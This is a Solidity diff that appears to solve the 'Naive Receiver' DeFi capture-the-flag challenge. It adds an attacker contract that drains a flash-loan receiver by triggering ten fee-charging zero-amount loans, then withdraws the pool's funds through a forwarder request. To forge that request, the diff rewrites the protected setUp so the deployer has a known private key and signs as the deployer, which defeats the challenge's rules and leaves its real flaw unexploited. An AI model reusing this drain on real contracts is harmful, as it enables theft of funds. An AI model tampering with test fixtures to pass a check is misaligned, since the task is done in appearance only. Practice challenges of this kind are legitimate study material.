@@ -7,8 +7,38 @@ import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/Naive
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
+contract NaiveReceiverAttacker {
+    constructor(
+        NaiveReceiverPool pool,
+        FlashLoanReceiver receiver,
+        WETH weth,
+        BasicForwarder forwarder,
+        address deployer,
+        address recovery,
+        uint256 withdrawAmount,
+        bytes memory signature
+    ) {
+        for (uint256 i = 0; i < 10; ++i) {
+            pool.flashLoan(receiver, address(weth), 0, "");
+        }
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: deployer,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: 0,
+            data: abi.encodeWithSelector(pool.withdraw.selector, withdrawAmount, payable(recovery)),
+            deadline: block.timestamp + 1 days
+        });
+
+        forwarder.execute(request, signature);
+    }
+}
+
 contract NaiveReceiverChallenge is Test {
-    address deployer = makeAddr("deployer");
+    address deployer;
+    uint256 deployerPk;
     address recovery = makeAddr("recovery");
     address player;
     uint256 playerPk;
@@ -33,6 +63,7 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
+        (deployer, deployerPk) = makeAddrAndKey("deployer");
         startHoax(deployer);
 
         // Deploy WETH
@@ -77,7 +108,25 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        uint256 withdrawAmount = WETH_IN_POOL + WETH_IN_RECEIVER;
+        bytes memory signature;
+        {
+            BasicForwarder.Request memory request = BasicForwarder.Request({
+                from: deployer,
+                target: address(pool),
+                value: 0,
+                gas: 1_000_000,
+                nonce: 0,
+                data: abi.encodeWithSelector(pool.withdraw.selector, withdrawAmount, payable(recovery)),
+                deadline: block.timestamp + 1 days
+            });
+
+            bytes32 digest = keccak256(abi.encodePacked(hex"1901", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, digest);
+            signature = abi.encodePacked(r, s, v);
+        }
+
+        new NaiveReceiverAttacker(pool, receiver, weth, forwarder, deployer, recovery, WETH_IN_POOL + WETH_IN_RECEIVER, signature);
     }
 
     /**
